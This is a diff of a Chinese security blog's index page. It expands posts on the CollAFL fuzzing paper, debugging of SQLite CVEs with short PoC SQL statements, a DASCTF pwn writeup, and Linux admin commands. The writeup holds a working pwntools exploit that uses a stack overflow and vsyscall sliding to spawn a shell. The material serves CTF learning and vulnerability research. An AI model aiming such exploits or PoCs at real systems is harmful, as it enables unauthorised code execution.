+<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009104219062.png" alt="image-20201009104219062"></p>
+<p>使用<code>afl-collect</code>和<code>AddressSanitizer</code>来去除重复的crashes，<strong>CollAFL并没有使用AddressSanitizer，所以有可能会遗漏不会引起崩溃的漏洞。</strong></p>
+<p>unique crashes：7500</p>
+<p>vulnerabilities：157</p>
+<p>CVE vulnerabilities：95。</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009105332088.png" alt="image-20201009105332088"></p>
+<h3 id="评估的随机性"><a href="#评估的随机性" class="headerlink" title="评估的随机性"></a>评估的随机性</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009110717825.png" alt="image-20201009110717825"></p>
+<p>20次试验中每个模糊器在路径发现上的平均RSD。通常情况路径发现的偏差小于4%，崩溃发现的偏差小于25%，崩溃发现的随机性要比路径发现的随机性要大。</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009111813673.png" alt="image-20201009111813673"></p>
+<p>对于vulnerabilities发现的偏差，表六为统计结果。例如，CollAFL-desc在20个试验中发现了18个Bug-6。在这18个测试中，最快的一个只花费6个小时来找到这个bug，而最慢的一个花费了超过57个小时来找到它。</p>
+<h3 id="Fuzzer对比"><a href="#Fuzzer对比" class="headerlink" title="Fuzzer对比"></a>Fuzzer对比</h3><p>首先，我们评估了AFL的一个变体，即AFL-pc，它使用Clang提供的trace-pc-guard  instrumentation方法来跟踪块覆盖，而不是边缘覆盖。其次，我们采用了<code>lafl-intel</code>提供的另一种工具解决方案，它将长整数和字符串比较操作划分为较小的操作，并将switch语句拆分为一组if-else语句。然后我们分别将lafl-intel与AFL和CollAFL结合，分别表示为<code>AFL-laf</code>和<code>CollAFL-br-laf</code>。</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009113027060.png" alt="image-20201009113027060"></p>
+<p>AFL-laf在LAVA数据集上的表现比其他的都好，但是在真实的application中表现不行，这说明LAVA数据集中有大量的长字符/整数比较，但这在真实application中是不会的；CollAFL-br-laf优于AFL-laf，表明该选种策略是有效的。</p>
+<h2 id="6-结论"><a href="#6-结论" class="headerlink" title="6. 结论"></a>6. 结论</h2><p>在本文中，我们研究了覆盖制导模糊雷达中覆盖误差的负面影响。我们提出了一个覆盖敏感的模糊解决方案CollAFL，它解决了最新的模糊AFL中的哈希冲突问题，使边缘覆盖信息更加准确，同时仍然保持低的仪器开销。基于精确的覆盖信息，我们提出了三种新的种子选择策略来驱动模糊器直接到达未探索的路径。实验表明，该方案在路径发现、崩溃发现和漏洞发现方面都是有效和高效的。我们发现了157个新的安全漏洞在24真实世界应用程序中,和95年证实了CVE。</p>
+
       
     </div>
 
@@ -946,97 +1124,79 @@
     
     
       <footer class="post-footer">
-          <div class="post-eof"></div>
-        
+        <div class="post-eof"></div>
       </footer>
   </article>
   
   
   
 
-    
-        
+      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/09/SQLite漏洞调试记录/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2020/11/09/SQLite漏洞调试记录/" class="post-title-link" itemprop="url">SQLite漏洞调试记录</a>
+        <h2 class="post-title" itemprop="name headline">
           
-        </h1>
+            <a href="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">SQLite漏洞调试记录</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              
-                
-              
-
               <time title="Created: 2020-11-09 18:28:51" itemprop="dateCreated datePublished" datetime="2020-11-09T18:28:51+08:00">2020-11-09</time>
             </span>
-          
-            
-
-            
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
+                  <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
                 <time title="Modified: 2020-11-10 10:08:23" itemprop="dateModified" datetime="2020-11-10T10:08:23+08:00">2020-11-10</time>
               </span>
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞挖掘/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a>
+                </span>
             </span>
-          
 
           
-            <span id="/2020/11/09/SQLite漏洞调试记录/" class="post-meta-item leancloud_visitors" data-flag-title="SQLite漏洞调试记录" title="Views">
+            <span id="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="SQLite漏洞调试记录" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2020/11/09/SQLite漏洞调试记录/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/11/09/SQLite漏洞调试记录/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -1051,16 +1211,45 @@
 
       
           <h2 id="1-CVE-2019-19599"><a href="#1-CVE-2019-19599" class="headerlink" title="1. CVE-2019-19599"></a>1. CVE-2019-19599</h2><p>源码：/ext/misc/zipfile.c，这个文件实现了一个虚拟表来读取和写入归档zip文件。</p>
-          <!--noindex-->
-          
-            <div class="post-button">
-              <a class="btn" href="/2020/11/09/SQLite漏洞调试记录/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
+<p>SQLite有一个表sqlite_master,包含了数据库中所有自建表的信息。</p>
+<p>查看一个表的所有信息：<code>pragma table_info([tablename]);</code></p>
+<h3 id="常见用法："><a href="#常见用法：" class="headerlink" title="常见用法："></a>常见用法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIRTUAL TABLE temp.zip USING zipfile(&#39;test.zip&#39;);</span><br><span class="line">INSERT INTO temp.zip(name, data) VALUES (&#39;dir\x00s1&#39;, NULL);</span><br></pre></td></tr></table></figure>
+
+<p>利用zipfile功能创建了一个虚表<code>temp.zip</code>,然后向其中插入一条数据。其中<code>name, data</code>是虚表中的两个字段，如果<code>data</code>的值为NULL的话，代表插入的数据是一个目录，否则是文件。</p>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述:"></a>漏洞描述:</h3><p>在涉及文件名中嵌入’\0’字符的情况下，SQLite 3.30.1中的ext/misc/zipfile.c会误处理INSERT INTO的某些用法，从而导致可以由（例如）valgrind检测到内存管理错误。</p>
+<h3 id="调试过程："><a href="#调试过程：" class="headerlink" title="调试过程："></a>调试过程：</h3><p>在一个终端启动sqlite3:</p>
+<p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200824011634623.png" alt="image-20200824011634623" title="启动sqlite3"></p>
+<p>再在另外一个终端查看sqlite3的进程号：48941</p>
+<p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200824011813218.png" alt="image-20200824011813218" title="sqlite进程信息"></p>
+<p>然后使用root权限启动gdb，在编译sqlite的时候加上<code>-g</code>参数就可以在这里使用file命令载入调试符号表，然后再进行<code>attach 48941</code>就可以正常调试了。</p>
+<h3 id="调试分析："><a href="#调试分析：" class="headerlink" title="调试分析："></a>调试分析：</h3><p>当使用gdb进行附加后，原来的sqlite会进入等待状态，这个时候不能进行任何输入。找到漏洞出现的源代码处，下断点<code>break zipfileUpdate</code>，然后<code>continue</code>，就可以在sqlite的终端输入命令了。</p>
+<p>使用<code>next, print, x</code>命令可以灵活查看调试过程中的变量内容，内存信息，使用<code>set</code>可以修改内容，由于<code>\0</code>字符在终端输入的时候会导致SQL语句被截掉一半的情况，所以为了形成描述中的情况，我在调试的过程中找到变量的位置并插入了’\0’字符。</p>
+<p>而在执行zipfileUpdate的时候，对于目录名，会在目录名之后添加一个’/‘字符，而由于’\0’的截断，会导致对目录名字符串长度计数的变量<code>nPath</code>计算出错，原来是单纯的<code>nPath++</code>,这样实际的目录名长度会比nPath要小，漏洞修复后改为strlen函数来计算正确的长度。</p>
+<h2 id="2-CVE-2019-19317"><a href="#2-CVE-2019-19317" class="headerlink" title="2. CVE-2019-19317"></a>2. CVE-2019-19317</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>在生成列的情况下，SQLite 3.30.1中resolve.c中的lookupName忽略了colUsed位掩码中的位，这使攻击者可以拒绝服务或可能造成未指定的其他影响。</p>
+<h3 id="调试分析：-1"><a href="#调试分析：-1" class="headerlink" title="调试分析："></a>调试分析：</h3><p>调试过程和前一个漏洞一样。</p>
+<p>由于暂时未找到触发漏洞处的代码的testcase，暂时搁置，先看论文中提到的4个Bug案例分析，再回头来看这个漏洞。</p>
+<h2 id="3-case-study-1：A-11-year-Bug"><a href="#3-case-study-1：A-11-year-Bug" class="headerlink" title="3. case study 1：A 11-year Bug"></a>3. case study 1：A 11-year Bug</h2><h3 id="漏洞描述：-1"><a href="#漏洞描述：-1" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>在2009年的check-in中，因为SQL语法中不允许出现GroupBy字句，所以在对IN字句进行优化的函数<code>isCandidateForInOpt</code>中对这一条件进行了断言设置。</p>
+<p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200903163744634.png" alt="image-20200903163744634"></p>
+<p>但是在IN字句中，如果出现NATURAL JOIN连接两个DISTINCT子查询的情况的话，会内部设置GROUP BY这个属性，导致断言失败。</p>
+<h3 id="调试分析：-2"><a href="#调试分析：-2" class="headerlink" title="调试分析："></a>调试分析：</h3><p>上面会内部设置GROUP BY这个属性的话，那么在执行IN字句优化例程函数的时候，<code>p-&gt;pGroupBy</code>应该不为0.但是在调试过程中发现，无论sqlite是在添加了<code>-DNDEBUG</code>参数还是没有添加的情况下，使用论文中提到的PoC来验证均发现没有改变这个属性。</p>
+<p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907083132163.png" alt="image-20200907083132163" title="Makefile中的Debug参数设置"></p>
+<p>下图为调试过程中的截图：</p>
+<p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907083404723.png" alt="image-20200907083404723"></p>
+<h2 id="4-case-study-2：Database-leakage"><a href="#4-case-study-2：Database-leakage" class="headerlink" title="4. case study 2：Database leakage"></a>4. case study 2：Database leakage</h2><p>原来这个就是CVE-2019-19959，怪我没有仔细看。</p>
+<p>按照论文中给出的PoC来验证，感觉没有什么异常啊，只是单纯的把经过zipfile函数生成的一个zip用hex的方式显示出来了而已，而且调试过程中并没有走到漏洞的源代码处。</p>
+<p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907092046829.png" alt="image-20200907092046829" title="CVE-2019-19959 PoC验证"></p>
+<h2 id="5-case-study-3：UAF-from-Assertion"><a href="#5-case-study-3：UAF-from-Assertion" class="headerlink" title="5. case study 3：UAF from Assertion"></a>5. case study 3：UAF from Assertion</h2><p>这个bug获得了CVE编号：CVE-2019-20218。</p>
+<p>使用PoC验证时，sqlite直接爆语法错误。第二条sql语句需要和第三条同时输入，然后再测试第三条SQL语句。</p>
+<p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907115230945.png" alt="image-20200907115230945" title="CVE-2019-20218 PoC验证"></p>
+<p>由于第二条语句创建的是一个循环视图（创建视图v2的数据来自要创建的视图v2），会导致其pWith指针称为一个悬空指针。</p>
+<p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907115849015.png" alt="image-20200907115849015" title="悬空指针"></p>
+<p>但是调试到后面，导致程序崩溃的情况是在一个比较函数里面：</p>
+<p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907164940502.png" alt="image-20200907164940502" title="sqlite3StrICmp函数"></p>
+<p>而且调用这个函数的地方是在这个漏洞修补处的前面，按道理在后面修补，前面同样会出问题的吧，且还没找到关于<code>p-&gt;pWith</code>指针的断言语句。</p>
+<p>而且我在加上<code>-DNDEBUG</code>参数之后再来测试，同样的还是崩溃了。</p>
+<p>后在大佬的指导下，解决了调试不能断在assert函数的地方的问题，需要再设置<code>-DSQLITE_DEBUG</code>这个参数，<code>sqlite3.c</code>中解释了这两个参数必须是相反的，如果注释了<code>-DNDEBUG</code>且没有定义<code>-DSQLITE_DEBUG</code>那么就会再次将<code>-DNDEBUG</code>设为1，所以解决方法就是注释掉<code>-DNDEBUG</code>的同时定义<code>-DSQLITE_DEBUG</code>。</p>
+<p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200920004802260.png" alt="image-20200920004802260"></p>
+
       
     </div>
 
@@ -1068,97 +1257,79 @@
     
     
       <footer class="post-footer">
-          <div class="post-eof"></div>
-        
+        <div class="post-eof"></div>
       </footer>
   </article>
   
   
   
 
-    
-        
+      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/09/19/DASCTF8月赛：magic-number/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2020/09/19/DASCTF8月赛：magic-number/" class="post-title-link" itemprop="url">DASCTF8月赛：magic_number</a>
+        <h2 class="post-title" itemprop="name headline">
           
-        </h1>
+            <a href="/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/" class="post-title-link" itemprop="url">DASCTF8月赛：magic_number</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              
-                
-              
-
               <time title="Created: 2020-09-19 17:21:11" itemprop="dateCreated datePublished" datetime="2020-09-19T17:21:11+08:00">2020-09-19</time>
             </span>
-          
-            
-
-            
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
+                  <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
                 <time title="Modified: 2020-09-20 00:23:18" itemprop="dateModified" datetime="2020-09-20T00:23:18+08:00">2020-09-20</time>
               </span>
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+                </span>
             </span>
-          
 
           
-            <span id="/2020/09/19/DASCTF8月赛：magic-number/" class="post-meta-item leancloud_visitors" data-flag-title="DASCTF8月赛：magic_number" title="Views">
+            <span id="/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/" class="post-meta-item leancloud_visitors" data-flag-title="DASCTF8月赛：magic_number" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2020/09/19/DASCTF8月赛：magic-number/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/09/19/DASCTF8月赛：magic-number/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -1173,16 +1344,16 @@
 
       
           <p>题目中给出现成的调用<code>system(&quot;/bin/sh&quot;);</code>的执行地址，且存在栈上面的缓冲区溢出漏洞，不过因为程序开启了PIE（地址随机化），所以不能直接的用IDA中显示的地址覆盖。</p>
-          <!--noindex-->
-          
-            <div class="post-button">
-              <a class="btn" href="/2020/09/19/DASCTF8月赛：magic-number/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
+<p><img src="/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/image-20200919235944186.png" alt="image-20200919235944186"></p>
+<p>不过地址随机化了，但最后一个字节的地址还是一致的，这里可以利用<code>vsyscall</code>来进行滑动，在内存中找到合适的地址来利用就可以了。<code>vsyscall</code>是无参数的调用，就相当于一个ROP gadget, 可利用的三个地址为：0xffffffffff600000, 0xffffffffff600400, 0xffffffffff600800。</p>
+<p>仔细调试程序，发现在栈上存在一个可利用的地址，即<code>__libc_start_main</code>传参的时候把main函数的地址放到了栈上，而main函数的地址和<code>system(&quot;/bin/sh&quot;);</code>的地址就只有最后一个字节不一样，所以就可以利用了。</p>
+<p><img src="/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/image-20200920001344963.png" alt="image-20200920001344963"></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;183.129.189.60&#x27;,10010)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(5)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">&#x27;B&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+<span class="string">&#x27;\xA8&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your Input :\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>本地测试如下：</p>
+<p><img src="/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/image-20200920002301586.png" alt="image-20200920002301586"></p>
+
       
     </div>
 
@@ -1190,97 +1361,79 @@
     
     
       <footer class="post-footer">
-          <div class="post-eof"></div>
-        
+        <div class="post-eof"></div>
       </footer>
   </article>
   
   
   
 
-    
-        
+      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/06/24/Linux常用命令（更新）/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/06/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2020/06/24/Linux常用命令（更新）/" class="post-title-link" itemprop="url">Linux常用命令（更新）</a>
+        <h2 class="post-title" itemprop="name headline">
           
-        </h1>
+            <a href="/2020/06/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/" class="post-title-link" itemprop="url">Linux常用命令（更新）</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              
-                
-              
-
               <time title="Created: 2020-06-24 16:21:50" itemprop="dateCreated datePublished" datetime="2020-06-24T16:21:50+08:00">2020-06-24</time>
             </span>
-          
-            
-
-            
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
+                  <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
                 <time title="Modified: 2020-11-09 19:12:09" itemprop="dateModified" datetime="2020-11-09T19:12:09+08:00">2020-11-09</time>
               </span>
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
+                </span>
             </span>
-          
 
           
-            <span id="/2020/06/24/Linux常用命令（更新）/" class="post-meta-item leancloud_visitors" data-flag-title="Linux常用命令（更新）" title="Views">
+            <span id="/2020/06/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/" class="post-meta-item leancloud_visitors" data-flag-title="Linux常用命令（更新）" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2020/06/24/Linux常用命令（更新）/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/06/24/Linux常用命令（更新）/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2020/06/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -1294,17 +1447,25 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>今天重新登上了自己的服务器，发现好多操作的命令都忘了，因此这里需要记录一下，后面也会补充吧。</p><h3 id="用户相关的命令"><a href="#用户相关的命令" class="headerlink" title="用户相关的命令"></a>用户相关的命令</h3>
-          <!--noindex-->
-          
-            <div class="post-button">
-              <a class="btn" href="/2020/06/24/Linux常用命令（更新）/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
+          <p>今天重新登上了自己的服务器，发现好多操作的命令都忘了，因此这里需要记录一下，后面也会补充吧。</p>
+<h3 id="用户相关的命令"><a href="#用户相关的命令" class="headerlink" title="用户相关的命令"></a>用户相关的命令</h3><p>创建用户：<code>adduser username</code>,创建一个用户，也会在home目录下创建相应的目录；<code>useradd username</code>,只是创建了一个用户名，可以添加<code>-m</code>参数实现创建home下的目录。</p>
+<p>修改密码：<code>passwd username</code>.</p>
+<p>删除用户：<code>userdel -r username</code>.</p>
+<p>为创建的用户赋予管理员权限：添加<code>/etc/sudoers.d/username</code>文件，添加相应用户，例如<code>username ALL=(ALL) ALL</code>。如果是修改<code>/etc/passwd</code>中相应用户的用户ID的话，登录会直接以ROOT登录，修改sudoers文件相应给到用户的权限会安全一点。</p>
+<h3 id="fux"><a href="#fux" class="headerlink" title="fux"></a>fux</h3><p>修改ssh连接端口：找到<code>/etc/ssh/sshd_config</code>文件，找到相应的行修改端口就行。</p>
+<p>修改source.list文件：<code>sudo vi /etc/apt/sources.list</code>,添加相应的代理，最好先将原来的文件备份一个。</p>
+<p>查看服务开启状态：<code>sudo service --status-all</code>.</p>
